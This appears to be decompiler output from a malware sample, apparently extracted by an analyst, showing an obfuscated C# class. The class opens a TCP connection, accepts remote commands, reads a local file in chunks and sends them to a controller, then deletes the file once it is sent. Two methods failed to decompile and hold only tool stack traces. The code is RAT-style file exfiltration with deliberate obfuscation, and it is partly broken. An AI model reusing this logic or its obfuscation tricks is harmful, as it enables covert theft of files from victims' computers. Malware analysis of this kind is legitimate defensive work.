using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

public class _____________________________________
{
	private FileStream _;

	public string __;

	public string ___;

	public int ____;

	public int _____;

	private TcpClient ______;

	private bool _______;

	private _____________________________________.______________________________________ ________;

	public StreamWriter _________;

	public StreamReader __________;

	private string ___________;

	public string ____________;

	public _____________________________________()
	{
		this.____ = 1024;
		this._____ = 0;
		this._______ = false;
		this.___________ = <Module>._______<string>(363088510);
		this.____________ = <Module>.______<string>(2103125196);
	}

	public void ___(string string_0)
	{
		int num;
		int num1;
		int num2;
		string string0 = string_0;
		int ____ = ______________________._______;
		num1 = ((1073742047 ^ ____ / 427613) == 0 ? Type.EmptyTypes.Length + -1273139748 : Type.EmptyTypes.Length + 24064);
		int _______ = <Module>.C;
		if ((_______ * 214 + 298 * _______) / 2134281 == -1056418411)
		{
			num2 = (int)(sizeof(ushort) + 1761230917);
		}
		else if (79683584 * ____ == -5380)
		{
			int ________ = <Module>._______________;
			num2 = (~(________ << 6 | ____ * 262144) != 64 * -________ ? 1190942287 : 861944032);
		}
		else
		{
			num2 = (1409286144 * _______ - 1468 + -4923 != -_______ + _______ ? Type.EmptyTypes.Length + 25636 : Type.EmptyTypes.Length + 1752630555);
		}
		string_0 = ___________________________________________________________________._(string0, <Module>.__________(num1, num2, Type.EmptyTypes.Length + 199));
		try
		{
			while (true)
			{
				if (string_0.Contains(<Module>.____<string>(329123169)))
				{
					this._________();
					num = (int)(sizeof(Guid) + -124);
				}
				num = -108;
				int _________ = <Module>._________________;
				if ((-(6 * _________ + 58 * _________) | -1001521152 * _________) != -5906)
				{
					if (Operators.CompareString(string_0, <Module>.___<string>(616668267), false) != 0)
					{
						break;
					}
					if (num == -108)
					{
						this._______();
						break;
					}
				}
			}
			if (string_0.Contains(<Module>.______<string>(-1629277725)))
			{
				string str = string_0.Replace(<Module>.___<string>(-1049694595), string.Empty);
				this._.Position = (long)Convert.ToInt32(str);
				this._________();
			}
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			this._______();
			ProjectData.ClearProjectError();
		}
	}

	public void ____(byte[] byte_0)
	{
		try
		{
			MemoryStream memoryStream = new MemoryStream();
			memoryStream.Write(byte_0, 0, checked((int)byte_0.Length));
			memoryStream.Write(this._____(this.___________), 0, this.___________.Length);
			this.______.Client.Send(memoryStream.ToArray(), 0, (int)memoryStream.Length, SocketFlags.None);
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			this._______();
			ProjectData.ClearProjectError();
		}
	}

	public byte[] _____(string string_0)
	{
		return Encoding.Default.GetBytes(string_0);
	}

	public string ______(byte[] byte_0)
	{
		return Encoding.Default.GetString(byte_0);
	}

	public void _______()
	{
		// 
		// Current member / type: System.Void _____________________________________::_______()
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Void _______()
		// 
		// Object reference not set to an instance of an object.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 112
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 26
		//    at ..BuildTree( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\FastDominatorTreeBuilder.cs:line 25
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DominatorTreeDependentStep.cs:line 18
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 68
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	public void ________()
	{
		// 
		// Current member / type: System.Void _____________________________________::________()
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Void ________()
		// 
		// Object reference not set to an instance of an object.
		//    at ..(List`1 ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 163
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 102
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	public void _________()
	{
		int num = 0;
		byte[] numArray;
		MemoryStream memoryStream;
		object length;
		try
		{
		Label3:
			numArray = new byte[this.____ + 1];
			if (this._.Length - this._.Position >= (long)(checked((int)numArray.Length)))
			{
				goto Label0;
			}
			goto Label1;
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			this._______();
			ProjectData.ClearProjectError();
		}
		return;
	Label0:
		this._.Read(numArray, 0, checked((int)numArray.Length));
		num = (int)(sizeof(short) + -18157);
		length = Type.EmptyTypes.Length + 1;
		goto Label2;
	Label1:
		<Module>._________________ = 1898371779;
		numArray = new byte[(int)(this._.Length - this._.Position - 1L) + 1];
		length = sizeof(double) + -6;
	Label2:
		switch (length)
		{
			case 1:
			{
				while (true)
				{
					memoryStream = new MemoryStream();
					string str = string.Concat(<Module>.___<string>(1874919422), this.____________);
					int num1 = num;
					num = 6505;
					if (num1 == 29603)
					{
						break;
					}
					memoryStream.Write(this._____(str), 0, str.Length);
					num1 = num;
					num = -20573;
					if (num1 != 28750)
					{
						break;
					}
				}
				memoryStream.Write(numArray, 0, checked((int)numArray.Length));
				if (num != -20573)
				{
					goto Label3;
				}
				this.____(memoryStream.ToArray());
				memoryStream.Dispose();
				if (this._.Length == this._.Position)
				{
					if (this.__.Contains(______________________._____))
					{
						File.Delete(this.__);
					}
					Thread.Sleep(2000);
					this._______();
				}
				return;
			}
			case 2:
			{
				goto Label0;
			}
			default:
			{
				goto Label1;
			}
		}
	}

	public void __________(string string_0)
	{
		try
		{
			this._________ = new StreamWriter(this.______.GetStream());
			this._________.WriteLine(string.Concat(<Module>.______<string>(-1593785447), string_0));
			this._________.Flush();
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			this._______();
			ProjectData.ClearProjectError();
		}
	}

	public void ___________(IAsyncResult iasyncResult_0)
	{
		try
		{
			this.__________ = new StreamReader(this.______.GetStream());
			_____________________________________.______________________________________ _____ = this.________;
			if (_____ != null)
			{
				_____(this.__________.ReadLine());
			}
			NetworkStream stream = this.______.GetStream();
			byte[] numArray = new byte[] { 0 };
			_____________________________________ ___________________ = this;
			stream.BeginRead(numArray, 0, 0, new AsyncCallback(___________________.___________), null);
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			this._______();
			ProjectData.ClearProjectError();
		}
	}

	private event _____________________________________.______________________________________ _
	{
		add
		{
			this.________ += value;
		}
		remove
		{
			this.________ -= value;
		}
	}

	private delegate void ______________________________________(string string_0);
}